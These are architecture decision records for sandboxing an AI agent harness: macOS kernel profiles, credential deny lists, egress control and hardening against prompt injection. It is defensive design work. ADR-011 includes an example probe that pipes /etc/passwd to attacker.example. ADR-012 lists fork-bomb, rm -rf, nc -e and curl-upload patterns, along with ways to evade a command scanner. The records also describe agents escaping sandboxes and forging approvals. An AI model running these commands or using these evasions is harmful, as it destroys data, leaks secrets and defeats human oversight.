# Sandboxing — decision records

ADR-style records for ordin's v1 sandboxing design. Each record: Status / Context / Decision / Consequences. Records are append-only; supersede rather than edit when a decision changes.

For the implementation guide see [`../sandboxing-implementation.md`](../sandboxing-implementation.md). For the architecture diagram source see [`../sandboxing-architecture.md`](../sandboxing-architecture.md). For real-world findings discovered during Phase 5 smoke testing — including macOS-specific gotchas the design didn't anticipate — see [`../sandboxing-findings.md`](../sandboxing-findings.md).

## Prior art

The decisions below were informed by two adjacent projects worth reading directly when working on this code:

- **[Claude Code's sandboxing](https://code.claude.com/docs/en/sandboxing)** — Anthropic's CLI uses macOS `sandbox-exec` and Linux `bwrap` at the per-tool boundary. Same kernel primitives as us; different layer (per-tool inside the subprocess vs. per-process around the harness). Profile shape and reference deny-lists are directly applicable.
- **[Sharkcage](https://wan0.net/sharkcage/)** — Open-source kernel-enforced AI agent sandbox. Same OS primitive choices (Seatbelt / bubblewrap+seccomp / WSL2). Five-layer defense-in-depth that informs several deferred items below: SOCKS5 localhost proxy for egress (ADR-005), pre-execution command pattern scanner (ADR-012), AI-invisible gate approval channels (ADR-013). Notable explicit goal: small enough trust-critical surface to fully audit (~3.7k LOC).

Both projects validate the same primitive choices we made; sharkcage in particular explores hardening directions we mark as v2+ deferrals.

---

## ADR-001 — Sandbox boundary: B-process self-reexec

**Status:** Accepted (v1)

**Context:** ordin's agent process tree (CLI → engine → runtime → `claude -p` / AI SDK tools) runs with the user's full privileges. Three options were evaluated:

- **A.** Per-runtime sandboxing — each `AgentRuntime` wraps its own subprocess.
- **B-process.** Whole `ordin run` invocation self-reexecs under the sandbox; everything inherits.
- **B-worker.** Host process unsandboxed; engine spawned as a sandboxed child; JSONL IPC.

Option A is clean for `ClaudeCliRuntime` (one `spawn` to wrap) but breaks down for `AiSdkRuntime` whose tool loop runs in-process — every tool would need to be refactored. Each future engine (LangGraph, etc.) repeats the work. Option B-worker is strongest but introduces a new IPC seam unnecessary for a single-user dev tool.

**Decision:** Option B-process. The CLI parses args, then `execve`s itself under `sandbox-exec` so the kernel filter applies to the entire descendant process tree. Subprocesses (`claude -p`, MCP servers, AI SDK Bash tool) inherit automatically.

**Consequences:**

- One implementation point covers every current and future engine.
- `AiSdkRuntime`'s in-process tool loop is contained without refactor.
- Harness host concerns (RunStore writes, harness repo reads, TUI rendering) sit *inside* the same allowlist as the agent's concerns. Acceptable for a single-user dev tool; revisit with B-worker if a hosted/multi-tenant use case arrives.
- B-worker remains a future impl behind the same `Sandbox` interface — additive, not a redesign.

**Auditability target.** Borrowed from sharkcage's design discipline: keep `src/sandbox/` and its trust-critical dependencies small enough to be fully read by one person in a sitting. Soft budget: ≤1500 lines of TS in `src/sandbox/` (excluding tests), ≤400 lines for the rendered profile. Refuse abstractions that grow audit surface without proportionate gain. Profile authoring stays declarative (a TinyScheme template, not a builder DSL); reexec stays linear (one path, one helper module). Re-evaluate the budget at each phase and document any expansion in this ADR section.

**Alternative models considered.** Two materially different architectures exist; both rejected for v1 with reasoning preserved here so future reviewers don't re-derive it.

- **Per-command sandbox** (sharkcage's `srt`). Wrap *every* tool invocation in a fresh sandbox: `sandbox-exec -p <policy> bash -c <cmd>`. Stronger isolation (each command's sandbox is short-lived, no shared state between calls) but pays process-spawn overhead per tool call — meaningful when phases issue dozens of bash calls. Worth revisiting in v3 as an opt-in "paranoid mode" for security-sensitive contexts where the per-call latency is acceptable. The `Sandbox` interface admits this variant without redesign — the impl just changes where `enterIfNeeded` is called from (per-tool, not per-run).
- **B-worker** (separate sandboxed worker, JSONL IPC). Stronger separation of host concerns (RunStore, gates, TUI) from agent execution. Same `Sandbox` interface.

**B-worker promotion triggers.** B-process is the right v1 because the IPC seam costs more than the single-user `ordin run` workflow recoups. The trigger list — when adopting B-worker becomes net-positive — has grown longer than originally documented:

1. **TUI / sandbox lifecycle coupling** *(observed during v1 Phase 5)* — `execve` under `sandbox-exec` replaces the outer process; if the renderer initialised raw mode / mouse tracking / alt-screen first, capability-query responses leak to stdout and terminal state stays polluted. Today's mitigation (`prepareSandbox(input)` called before any TUI work — see [Finding 8](../sandboxing-findings.md#finding-8--b-process-couples-host-and-agent-lifecycles-tui-state-leaks-across-reexec)) is fragile to refactors. B-worker dissolves this — host never enters the sandbox; TUI lives outside the worker boundary.

2. **Per-phase profiles** *(v2 deliverable)* — when each phase wants its own profile, B-process means either reexec-per-phase (heavy; loses session continuity) or one union-of-all-phases profile (loose; defeats the per-phase win). B-worker spawns a fresh sandboxed worker per phase with its own profile — natural fit.

3. **Server-mode sandboxing** *(v2; ADR-008)* — `ordin serve` and `ordin mcp` cannot reexec mid-flight (server can't replace itself between requests). B-process effectively can't sandbox server modes at all. B-worker is the only viable path: server stays unsandboxed; each run spawns a sandboxed worker.

4. **Hosted / multi-tenant contexts** *(v3+)* — multiple concurrent runs need independent sandboxes. B-process means one sandbox per CLI invocation; the host can't manage many. Worker-per-run is the standard pattern.

5. **Audit-log integrity / secrets-not-shared** *(v3 hardening)* — host can hold credentials, signing keys, and write to tamper-evident audit logs (ADR-005 v3 follow-on). B-process gives the agent the same FS write access as the harness needs to write run metadata; B-worker keeps host-side state outside the worker's reach.

6. **Resource limits per run** *(future)* — `setrlimit`, OOM handling, wall-clock timeouts apply to whole processes. B-process means one limit envelope per CLI invocation; B-worker can apply different limits per worker (per phase, per agent).

The IPC seam is *cheap* in our case: gates already use async-resolve (maps to IPC-await-respond), `RunEvent`s are JSON-serializable, and `RunService.resolveGate` is literally the design pattern over a wire instead of in-memory. The cost is operational complexity, not architectural mismatch.

**When to actually promote.** Not on (1) alone — the `prepareSandbox` mitigation works. Strong promotion signals: (2) lands, OR (3) is requested, OR a contributor hits a refactor that re-introduces (1). Until then, B-worker stays the v3 deferral with the trigger list above kept current.

---

## ADR-002 — Profile strategy: broad-read + narrow-deny

**Status:** Superseded by [ADR-014](#adr-014--profile-strategy-narrow-allow-with-system-baseline-principle-of-least-privilege). Original record preserved below for the trail.

**Context:** Two profile philosophies:

- **Narrow-allow** — enumerate every readable directory.
- **Broad-read + narrow-deny** — allow read across home and system; deny a known-sensitive list.

Users will author workflows at arbitrary paths (`~/Documents/projects/foo`, mounted volumes, work directories). Narrow-allow breaks the moment someone puts a workflow somewhere unanticipated. Writes are the dangerous operation; reads are mostly inert.

**Decision:** Broad-read + narrow-deny for FS access. Reads allowed across `/`, `~/`, `/usr/`, `/opt/`, `/Library/`, `/System/`. Reads denied for `~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.netrc`, `~/.config/gh`, `~/.config/op`, browser profile dirs. Writes narrow: workspace root, `~/.ordin/runs/<runId>`, per-run `$TMPDIR`.

**Consequences:**

- Matches Chromium / Firefox / Claude Code prior art.
- Users can put workflows anywhere; no per-project profile churn.
- Sensitive credential dirs are explicit deny rules; adding a new one (e.g. `~/.config/op` for 1Password CLI) is a one-line profile change.
- Symlink handling needs care: `~/.aws` may be a symlink; `sandbox-exec` denies follow the resolved path. Test the deny list against realistic dotfile setups during profile authoring.

**Alternative philosophy considered (v3 stricter mode): explicit binary allowlist.** Sharkcage enumerates allowed binaries per skill (`exec: [git, npm, node]`); we allow read+exec across the broad PATH. The stricter model could ship as a v3 opt-in "paranoid mode" derived from each phase's `allowed_tools`: `Bash(git*)` permits `git`, `Bash(pnpm install*)` permits `pnpm` + the node binaries it transitively spawns, otherwise `Bash` is denied entirely. Trade-off: substantially safer against agent-fetched executables (a script downloaded into the workspace can't run as `bash workspace/malicious.sh`) but requires accurate enumeration of each tool's transitive binaries (e.g. pnpm spawns node spawns post-install scripts that spawn …). Defer until per-phase profiles (v2) ship and we have real data on phase-tool surfaces.

---

## ADR-003 — Single CLI-wide profile in v1; per-phase profiles deferred to v2

**Status:** Accepted (v1)

**Context:** The workflow YAML already declares `allowed_tools` per phase. A natural design derives the sandbox profile from that declaration: each phase invocation enters its own profile (Plan = read-only + write `docs/rfcs/`, Build = workspace write + Bash, Review = read-only + write `reviews/`).

Per-phase profiles require either: re-entering the sandbox per phase (each phase = a fresh `sandbox-exec` invocation) or a B-worker structure where the host coordinates per-phase workers. Both add complexity v1 doesn't need.

**Decision:** v1 ships one CLI-wide profile that covers the union of all phases' needs. v2 introduces per-phase profiles derived from `allowed_tools`.

**Consequences:**

- v1 ships sooner; the sandbox is real ("workspace + dev tooling, not your dotfiles") even before phase-level narrowing arrives.
- v2 design admits B-process per-phase (re-exec per phase) or B-worker per-phase (worker per phase). Choice deferred until the use case matures.
- Multi-agent topologies *within* a phase share the phase's profile; per-sub-agent narrowing belongs in the runtime's tool dispatcher (defense in depth, not sandbox responsibility).

---

## ADR-004 — macOS-only for v1; Linux + Docker deferred

**Status:** Accepted (v1)

**Context:** ordin's current users are all macOS. The repo is open source, so Linux and Windows contributors are plausible eventually. Cross-platform was considered as a v1 criterion; rejected because the *common* sandbox interface decouples "do we sandbox" from "how on this OS." Native sandboxes (`sandbox-exec`, `bwrap`) materially outperform Docker for dev loops because they keep host-installed dev tooling (`mise`, `pnpm`, `bun`, system frameworks) visible without rebuilding container images.

**Decision:** v1 implements `SeatbeltSandbox` (macOS) only. `BwrapSandbox` (Linux), `DockerSandbox` (cross-platform fallback), and Windows support are explicit v2+ deferrals behind the same `Sandbox` interface.

**Consequences:**

- v1 ships fast; Linux contributors hit a "not implemented on linux" error from `selectSandbox` until v2.
- `PassthroughSandbox` works everywhere as the default; non-macOS users are not blocked from running ordin, just from sandboxing.
- The `Sandbox` interface design must already admit the future variants. Validated by mentally fitting `BwrapSandbox` and `DockerSandbox` into the same surface (both fit).

---

## ADR-005 — FS-only enforcement in v1; network egress deferred to v2

**Status:** Accepted (v1)

**Context:** Network egress filtering is the higher-leverage protection (exfiltration of secrets is a worse outcome than overwriting `~/.bash_profile`). But it's also the trickier design — hostname-based filtering requires either explicit `HTTPS_PROXY` env-var routing through mitmproxy (works for ~95% of dev tooling), or `pf`-based transparent redirect (heavyweight on macOS), or DNS allowlisting (cheap but bypassable by direct-IP). v1 trying to ship both FS *and* egress couples two designs that can ship independently.

**Decision:** v1 enforces filesystem only. Network rules in the profile permit all outbound. v2 layers `HTTPS_PROXY` + mitmproxy + per-phase hostname allowlist (likely derived from `allowed_tools`).

**Consequences:**

- v1 protection: a misbehaving agent can read/write the workspace + run dir + temp; it cannot read `~/.ssh` or write outside those zones. It can still hit arbitrary network endpoints — this is a known v1 gap, called out in user-facing docs.
- v2 layers cleanly on top — no v1 design is a barrier.
- LiteLLM as a model-traffic consolidator already simplifies the eventual egress allowlist (one `localhost:4000` rule covers all model providers).

**v2 egress mechanism — provisional choice: SOCKS5 localhost proxy.** Borrowed from sharkcage. SOCKS5 handles all TCP traffic, not just HTTP(S), so it covers the edge cases an HTTP-only proxy misses (Go binaries with custom TLS stacks, git over SSH, custom protocols). Tools that don't honor `HTTPS_PROXY` typically *do* honor SOCKS5 via `proxychains` or native config. mitmproxy remains valuable as a *complementary* HTTPS-aware audit/inspection layer in front of (or alongside) the SOCKS5 gate, but the primary blocker is SOCKS5.

**v2 egress UX — "approve once, enforce always".** Authoring an egress allowlist by enumeration is a maintenance burden — every new dependency / git remote / tool needs a profile edit. Borrowed from sharkcage: the *first* time a phase requests an unseen hostname, prompt the user (existing gate-prompter mechanism, surfaced as a "capability request" rather than an artefact-approval gate); persist the answer to a project-local manifest (e.g. `~/.ordin/<project>/egress.yaml`); subsequent requests use the stored answer with no further prompts. Self-bootstrapping allowlist that converges to "exactly the hostnames this project actually needs." Removes the "enumerate everything upfront" tax that makes egress allowlists fall over in practice.

**v3 egress hardening: hash-chained audit logs.** Tamper-evident `audit.jsonl` for the egress gate's allow/deny stream — same fields as the sharkcage schema (`timestamp, tool, args, result, skill/agent, capability metadata`) plus a hash chain so post-hoc tampering is detectable. Out of scope for v2's first cut but the natural follow-on for hosted / compliance contexts.

---

## ADR-006 — `~/.claude` is read-only allowed

**Status:** Accepted (v1)

**Context:** `ClaudeCliRuntime` spawns `claude -p`, which authenticates against Anthropic via OAuth tokens stored in `~/.claude/`. Under the Max-plan billing relationship (the only programmatic Claude path for the maintainer), API-key auth is not an option — the binary must be able to read its credential dir. Blocking `~/.claude` outright breaks the runtime; allowing read+write would let a misbehaving agent corrupt or exfiltrate the tokens.

**Decision:** Profile allows read of `~/.claude`; writes denied. `claude -p` authenticates normally; the agent cannot tamper.

**Consequences:**

- ClaudeCliRuntime continues to work under Max plan inside the sandbox.
- Token rotation by `claude` itself (which writes back to `~/.claude/`) breaks under the sandbox if it tries to refresh from the agent's process tree. Mitigation: tokens are refreshed by `claude` *outside* a sandboxed run (e.g., `claude` invoked unsandboxed once); the cached token is read-only sufficient for ordinary runs. Verify this assumption during Phase 5 fixture testing.
- If we ever move off Max plan to API-key auth, `~/.claude` access is no longer required and this ADR can be superseded.

---

## ADR-007 — Default sandbox = passthrough; opt-in via config or CLI flag

**Status:** Accepted (v1)

**Context:** v1 cannot guarantee a perfect profile on first ship — false-positive denials (mise shims, JetBrains tools, etc.) will surface and need iteration. Forcing every user onto sandbox-by-default risks breaking workflows the day v1 lands.

**Decision:** Default sandbox mode is `passthrough` (current behavior). Users opt in via `ordin.config.yaml: sandbox: seatbelt` or `--sandbox seatbelt` flag on `ordin run`. CLI flag overrides config. Config defaults document the option; new users see the choice without being forced into it.

**Consequences:**

- No behavior change for existing users on day-of-merge.
- Adoption is gradual; profile bugs surface from opt-in users without breaking everyone.
- Once the profile is hardened over a few weeks of opt-in use, a future ADR can supersede this and flip the default to `seatbelt`.

---

## ADR-008 — Sandbox v1 applies to `ordin run` only

**Status:** Accepted (v1)

**Context:** ordin has multiple commands: `run`, `serve` (HTTP), `mcp` (MCP server), `retro`, `status`, `doctor`. `serve` and `mcp` use `RunService` which currently calls `HarnessRuntime.startRun` in-process. Sandboxing those servers means HTTP / MCP handlers either run inside the sandbox (allowing the profile to permit their port-bind and socket I/O) or sit outside with IPC into a sandboxed worker (B-worker). The clean answer is B-worker, which is v2.

**Decision:** v1 sandboxing applies to `ordin run` only. `serve`, `mcp`, `retro`, `status`, `doctor` remain unsandboxed.

**Consequences:**

- HTTP and MCP-driven runs are unsandboxed in v1. Documented as a known limitation in user-facing docs.
- v2 sandboxing for server modes is naturally addressed by introducing B-worker, since the gate-prompter pattern already uses async-resolve over an in-memory boundary that maps cleanly onto IPC.

---

## ADR-009 — `ORDIN_SANDBOXED=1` env var for reexec loop-prevention

**Status:** Accepted (v1)

**Context:** B-process self-reexec means `ordin` calls `execve("sandbox-exec", [..., "ordin", "run", "--sandbox", ...])`. Without a marker, the new invocation re-reads `--sandbox` and re-execs again — infinite loop.

Two ways to mark "this is the inner invocation":

1. Env var `ORDIN_SANDBOXED=1` set by the outer process before `execve`.
2. Two distinct entry points (`src/cli/index.ts` is outer; `src/cli/sandboxed-entry.ts` is inner; outer execs into inner directly).

**Decision:** Env var. Standard pattern (sudo, bwrap, many self-bootstrapping tools). One entry point to maintain. The env var is loop-prevention only, not a security boundary — kernel `sandbox-exec` enforcement does the actual confinement; an attacker setting `ORDIN_SANDBOXED=1` in their shell merely bypasses the *re-exec branch*, identical to running ordin without `--sandbox`.

**Consequences:**

- One entry point in code; the inner/outer distinction is a startup-time check.
- Two-entries alternative documented and acceptable as a swap during implementation if env-var taste objections surface.

---

## ADR-010 — Phase = sandbox profile boundary in v2 (not per-agent)

**Status:** Provisional (informs v2 design; v1 ships single profile)

**Context:** When per-phase profiles arrive, the unit of confinement could be the phase (current YAML structure) or the individual agent (in a future multi-agent topology where one phase fans out to multiple cooperating agents).

Phase-level matches the existing `allowed_tools` YAML declaration, the artefact contract, and the gate boundary. Multi-agent topologies within a phase share workspace and tool surface anyway — splitting their profiles would over-fracture without commensurate security gain. Tool-surface differentiation between sub-agents is better served by the runtime's tool dispatcher refusing to dispatch certain tools to certain sub-agents.

**Decision:** When per-phase profiles ship in v2, the unit is the **phase**, not the agent. Multi-agent topologies share the phase profile. Agent-level narrowing is the runtime's tool dispatcher's responsibility (inner fence; defense in depth).

**Consequences:**

- v2 design has a clear default. Per-agent profiles can be re-evaluated if a concrete need surfaces.
- v1 single-profile design transitions cleanly: replace "one profile for the whole run" with "one profile per phase invocation" — same shape, smaller scope.

---

## ADR-011 — Adversarial verification: probe tests + captive workflow

**Status:** Accepted (v1)

**Context:** A sandbox profile is only as good as our confidence that it denies what we think. Two failure modes: profile bugs ("we thought `~/.ssh` was denied, it isn't") and unanticipated escape vectors ("the agent found a creative way out we didn't enumerate"). Hand-watching `log stream` catches some bugs; manual `cat ~/.ssh/config` testing is brittle and easy to forget.

**Decision:** Two complementary verification layers, both v1.

1. **Profile-level probe tests** — `src/sandbox/seatbelt/probes.ts` defines a `[id, description, expected, command]` table. `src/sandbox/seatbelt/probes.test.ts` (gated to darwin) spawns `bash -c <cmd>` under the rendered profile via the same code path `SeatbeltSandbox` uses; asserts denied probes exit non-zero, allowed probes exit zero. Categories: read-deny (`~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.netrc`, `~/.config/gh`), write-deny (outside workspace + run dir + tmpdir), read-allow (`~/.claude`), write-allow (workspace), symlink (create symlink to denied path, attempt read through it). Fast, deterministic, runs in CI.

2. **Captive workflow** — `workflows/sandbox-probe.yaml` + `agents/sandbox-probe.md`. An LLM-driven agent under instruction to test sandbox bounds, attempting documented escape categories and recording each outcome in a report artefact. Run manually periodically; humans review for unexpected successes (the LLM may try things outside the fixed probe list).

Layer (1) is the regression test; layer (2) is the creativity test.

**Consequences:**

- Profile changes are immediately validated by (1) before commit. CI surfaces drift.
- (2) finds escapes (1) doesn't, because the LLM may exercise vectors no one enumerated (symlink chains, env-var leakage, unexpected exec paths). Worth the cost of an LLM call periodically.
- Both layers depend on `--sandbox seatbelt` being active. Probe tests assert `expected === "deny"` outcomes only when the profile is in force; the test harness skips assertions if no profile is rendered (but flags the skip loudly).
- The captive workflow can be re-purposed for v2 egress verification (probes like `cat /etc/passwd | curl -d @- attacker.example` to assert the egress allowlist holds) without redesigning the layer.
- Probes act as living documentation of the threat model — adding a new deny path means adding a probe; removing one is a deliberate, reviewed act.

---

## ADR-012 — Pre-execution command pattern scanner (inner fence)

**Status:** Provisional (v3 — hardening layer)

**Context:** The kernel sandbox prevents the agent from reaching outside the workspace, but it doesn't prevent destructive operations *inside* the allowed zones — `rm -rf .git`, `dd of=…workspace…`, `: () { : | : & }; :` (fork bomb), or simply running a malicious script the agent fetched into the workspace. ADR-010 noted that per-sub-agent narrowing belongs at the runtime's tool dispatcher; this ADR expands on what that fence concretely does.

Sharkcage (see Prior art) uses a JSON pattern file checked before each tool execution. Patterns are intentionally simple (regex match on the command string) — defense-in-depth rather than airtight protection.

**Decision (provisional):** Add a pre-execution command pattern scanner at the runtime's tool dispatcher level. The scanner consults a versioned pattern file (`src/sandbox/patterns.json` or similar) listing dangerous-command shapes; matches block execution and emit a `RunEvent` with the matched pattern + command for human review.

**API surface — `tool.before` / `tool.after` hooks.** Borrowed from sharkcage's interceptor plugin pattern. Rather than open-coding the scanner inside each runtime's dispatcher, expose the surface at the `AgentRuntime` interface:

```ts
interface ToolHooks {
  before?(call: ToolCall): Promise<ToolDecision>;  // allow | block | rewrite
  after?(call: ToolCall, result: ToolResult): Promise<void>;
}
```

`AgentRuntime` impls call hooks if registered; the harness wires the pattern scanner as a default `before` hook (and audit-emit as a default `after` hook). Composable, testable, and lets future hardening layers (e.g. a v3 mandatory-mode that tightens patterns based on phase) plug in without touching runtimes.

Pattern categories (initial sketch):
- Filesystem-destructive: `rm -rf`, `find … -delete`, `dd of=`, `> /dev/sda*`.
- Network-exfil: `curl … -d @`, `nc -e`, `wget … --post-file`.
- Privilege escalation: `sudo`, `su`, `setuid`.
- Self-modification: writes to `~/.ordin/`, the harness repo, the `~/.claude/` dir.
- Shell exotica: fork bombs, `eval` of base64, `exec` redirection of stdio descriptors.

**Consequences:**

- Catches destructive commands the kernel sandbox allows because they're inside the workspace.
- Pattern matching is fragile by nature — bypasses exist (`r''m -rf`, base64, command substitution). The scanner is *defense-in-depth*, not the primary protection. It buys time and creates audit signal.
- v2 work, not v1 — out of scope until kernel sandbox + egress are stable.
- Pattern file is versioned in-repo and treated as a security-relevant artefact: changes go through review.
- Probe tests (ADR-011) extend to cover the pattern file: each pattern gets a probe asserting it actually blocks the matching command.

---

## ADR-013 — AI-invisible gate approval channels (prompt-injection hardening)

**Status:** Provisional (v3 — hardening layer)

**Context:** Today's `HumanGate` surfaces prompts via the OpenTUI footer or the HTTP `RunService` endpoint. Both are technically reachable through channels the agent can write to (the agent prints to the same stdout the TUI renders into; an agent with HTTP egress could in principle craft a request to its own gate endpoint). Prompt-injection-resistant gate prompting requires the human-decision channel to be physically out-of-band — a path the agent cannot perceive, fake, or influence.

Sharkcage (see Prior art) routes approvals through Signal / Telegram. The user receives a push notification on a separate device; their decision is delivered back through the same external channel. The agent has no way to forge "[gate approved]" because the approval doesn't traverse anything the agent can write.

**Decision (provisional):** Provide an out-of-band `GatePrompter` impl as a v2+ option. Concrete candidates: a Signal-bot prompter, an Apple Push Notification prompter, an SMS prompter (via Twilio), or a phone-side companion app that polls the harness's HTTP endpoint with auth tied to a hardware key. Existing `RunService.resolveGate` already provides the architectural seam — only the prompter changes.

**Consequences:**

- Any phase with a `human` gate can be configured to require out-of-band approval; phases with `auto` gates are unaffected.
- A compromised agent cannot fake gate approvals — the channel is outside its sandbox by construction (kernel + transport-level).
- Implementation cost is real (notification routing, auth, mobile UX) — defer until prompt-injection-resistance becomes a concrete requirement (e.g. ordin processes anything sensitive, or runs unattended).
- Existing TUI / HTTP / MCP prompters remain valid for the dev-loop use case where the user is the one running the agent and prompt injection of self-issued tasks is a low risk.

---

## ADR-014 — Profile strategy: narrow-allow with system baseline (principle of least privilege)

**Status:** Accepted (v1) — supersedes [ADR-002](#adr-002--profile-strategy-broad-read--narrow-deny).

**Context:** ADR-002 chose broad-read + narrow-deny on the basis that enumerating every readable path on macOS was impractical. On review, that argument doesn't hold:

- The "system baseline is unenumerable" objection — Apple-style sandboxes solve this with explicit allows for the dyld cache and frameworks (`/usr`, `/System`, `/Library`, `/private/var/db/dyld`). Chromium and Firefox both do this. One block of allows, ~10 lines.
- The "dev tooling varies per user" objection — the *roots* are a finite enumerable list (~15 entries: `/opt/homebrew`, `~/.local`, `~/.bun`, `~/.cargo`, `~/.rustup`, `~/.asdf`, `~/.nvm`, `~/.npm`, `~/Library/pnpm`, etc.). Maintainable.
- The "workspaces live anywhere" objection — workspace path is a profile parameter; a single `(allow file-read* (subpath WORKSPACE_ROOT))` covers any location.

The asymmetry of failure modes is decisive. Under broad-read + narrow-deny, a credential dir we forgot to deny leaks silently. Under narrow-allow, a tool path we forgot to allow breaks loudly with an error pointing exactly at the missing rule. **Loud-and-broken beats silent-and-leaked for security defaults.**

ADR-002's risk envelope was much wider than appreciated: `~/Documents`, `~/Desktop`, `~/Downloads`, `~/Movies`, `~/Pictures`, `~/Library/Mobile Documents` (iCloud), `~/Library/Mail`, `~/Library/Messages`, `~/Library/Application Support/{Slack,Discord,Signal,Telegram}`, plus arbitrary `~/.foo/credentials` patterns we don't know about — all reachable under broad-read once the user grants the parent terminal Full Disk Access (which the README pre-flight tells them to do). None of these are useful for dev work; all of them are sensitive.

**Decision:** Narrow-allow with system baseline. Profile structure:

1. `(deny default)` as the baseline.
2. **System baseline via `(import "system.sb")`**, plus explicit allows for the operations that import suppresses (`mach-bootstrap`, `syscall*`, `mach-lookup`, `sysctl-read`, `iokit-open`, `ipc-posix-shm`, `ipc-posix-sem`). Plus a small extra-roots list (`/usr`, `/bin`, `/sbin`, `/private/etc`, `/Library`, `/Applications`, `/opt`) for tools beyond what system.sb covers. Plus `(allow dynamic-code-generation)` for JIT engines (Bun, V8, JVMs). See [findings doc](../sandboxing-findings.md) for the deployment-derived rationale — the original "we don't import system.sb" reasoning was wrong on review.
3. **Dev tooling roots** allowed for read: enumerated list of common per-user tool installs (`~/.local`, `~/.bun`, `~/.cargo`, `~/.rustup`, `~/.asdf`, `~/.nvm`, `~/.npm`, `~/.pnpm-store`, `~/.gem`, `~/.composer`, `~/.go`, `~/.cache`, `~/.config/mise`, `~/Library/pnpm`).
4. **Common config files** allowed for read: `~/.gitconfig`, `~/.bash_profile`, `~/.bashrc`, `~/.zshrc`, `~/.zshenv`, `~/.profile`. (Literal-file allows, not subpaths.)
5. **`~/.claude`** allowed for read (ADR-006 — Max-plan auth).
6. **Workspace + run-store + temp** allowed for read+write.
7. **Defense-in-depth denies** for paths the rules above might inadvertently expose (`~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.docker`, `~/.config/gh`, `~/.config/op`, plus literals `~/.netrc`, `~/.git-credentials`, `~/.npmrc`, `~/.pypirc`). Most of these are denied by default (no allow rule covers them) but explicit deny gives belt-and-braces protection if the allow list ever broadens.

**Consequences:**

- ~/Documents, ~/Desktop, ~/Downloads, iCloud, Mail, Messages, Slack, browser data, and arbitrary `~/.foo/creds` patterns are all denied by default — without us having to enumerate them.
- Dev workflows will discover missing allow rules during Phase 5 fixture testing. Expected, accepted, security-positive iteration.
- Phase 6 probe tests gain real meaning: deny-by-default means probes for `~/Documents/anything`, `~/Library/Messages`, `~/.docker/config.json` all assert deny — and they'd fail if anyone accidentally widens the allow list.
- Profile is longer than ADR-002's version — soft auditability budget (ADR-001) accommodates it well within ≤400 lines for the rendered profile.
- ADR-002 is preserved as the superseded record; the trail of "we considered this and reversed" is intact.

---

## ADR-015 — Broker as canonical worker-egress boundary, independent of sandbox mode

**Status:** Accepted (formalises shipped behaviour)

**Context:** ADR-001 deferred B-worker to v3+. In practice, the broker (`src/broker/`) shipped early — wired as srt's `parentProxy` to satisfy credential isolation (Langfuse `pk:sk` never reaches the worker) and audit-chain requirements (sha256-chained envelopes for every forward). The architecture diagram describes the broker as a sandbox-coupled component; on review its responsibilities — credential injection, per-host allowlist, audit chain, virtual hostname mapping (`http://otel/...` → `127.0.0.1:3000`) — are independent of whether kernel sandboxing is active.

In `--sandbox seatbelt` runs, srt enforces "egress only via broker" at the kernel layer. In `--sandbox passthrough` runs, the worker has no kernel enforcement; the broker still gates traffic the worker chooses to route through it (`HTTP_PROXY` env), still injects credentials, still audits. Two enforcement layers, one transport pattern.

**Decision:** The broker is the harness's trust boundary, not a sandbox component. Kernel sandboxing is one mechanism that elevates "broker-routed by discipline" to "broker-routed by enforcement"; the value of the broker survives without it.

- Broker accepts traffic from any worker (sandboxed or not) — one API, no mode-specific code paths.
- Per-mode wiring of `HTTP_PROXY` stays as is: srt mode injects via `parentProxy` (worker env clean of secrets); non-srt mode injects via worker env directly (`src/runtime/worker-policy.ts:39`).
- All worker-originated egress (model traffic, telemetry, audit endpoints, future tool dispatch per ADR-016) flows through the broker regardless of mode.

**Consequences:**

- Audit, credential isolation, and (with ADR-016) tool-dispatch enforcement work in unsandboxed dev runs too — useful where srt isn't available (current Linux story) or already-isolated outer environments (`ordin serve` inside a hosted container).
- Removes the implicit "broker is for sandbox" coupling in the architecture diagram. Broker = trust boundary; sandbox = kernel enforcement; both compose, neither requires the other.
- Test surface stays small: no `if (sandboxed) ... else ...` branches inside the broker.

---

## ADR-016 — Tool dispatch via broker (B-worker tool boundary)

**Status:** Provisional (v3 — completes B-worker per ADR-001 trigger list)

**Context:** ADR-001 reserved B-worker. ADR-012 deferred a pre-execution pattern scanner. Both decisions converge on the same gap: today `ToolDispatcher.dispatch(name, input, ctx)` runs in-process inside the worker (`src/worker/runtimes/shared/dispatcher.ts`). A pattern scanner inserted at that point runs in the same trust domain as the agent. A sandbox escape — or a clever prompt injection that causes the dispatcher to be bypassed — defeats the scanner along with the rest of the worker code.

ADR-015 formalised the broker as the canonical worker-egress boundary. This ADR extends that boundary to include tool dispatch — completing the B-worker trust separation that ADR-001 reserved.

**Decision:** Tool dispatch becomes RPC over the broker.

- Worker emits tool **intents** (`{tool, input, run_id, phase_id, span_context}`) over HTTP to the broker.
- Broker enforces:
  - Per-phase ACL derived from the workflow's `allowed_tools`.
  - Pre-execution pattern scanner (ADR-012) — denied patterns rejected at the boundary, audit-logged.
  - Audit-chain entry per attempt (allowed *and* denied).
- Broker (or a separately-trusted tool-runner process) executes the tool and returns the result.
- Worker no longer makes filesystem or subprocess syscalls for tool execution. Its role reduces to model orchestration + tool-intent emission.

**Consequences:**

- **Trust separation in multi-process modes.** When the broker runs in a separate process from the agent (sandboxed runs, hosted runs), process-level RCE in the worker no longer grants tool access; the attacker would need to compromise the broker too.
- **Policy enforcement in single-process mode.** Default `--sandbox passthrough` runs use the in-process `BrokerClient` (per ADR-018). The trust boundary is logical, not physical: ACL, pattern scanner, and audit chain all run, but the agent and the broker share an address space. This is the same posture as today's in-worker dispatcher, with the policy code consolidated.
- **Pattern scanner is implementable.** ADR-012's defense-in-depth surface is meaningful in both modes — strongest when the scanner runs in a separate process from the agent.
- **Audit unifies.** Today's chain captures broker forwards (network) but not in-worker tool calls. After this ADR, every tool intent — allowed, denied, executed, errored — is in the chain regardless of transport.
- **Per-phase ACL enforced at the trust boundary**, not inside the agent code path. The agent can declare any tool intent it wants; the broker authorises against the workflow declaration.
- **Latency cost (multi-process only).** HTTP-transport mode pays ~1–10 ms per tool call vs in-process function calls. Phases issuing dozens of bash calls pay spawn-equivalent overhead. Acceptable for sandboxed runs; in-process mode (default) avoids this entirely.
- **Audit budget.** ADR-001's 1500-LOC budget for `src/sandbox/` doesn't cover `src/broker/` directly; this ADR extends the discipline — treat the budget as inclusive of trust-critical code regardless of directory. Pattern scanner + dispatch handler must fit alongside existing broker code.
- **New failure mode.** Broker wedge → no tool execution. Existing audit-broker failure modes apply equivalently.

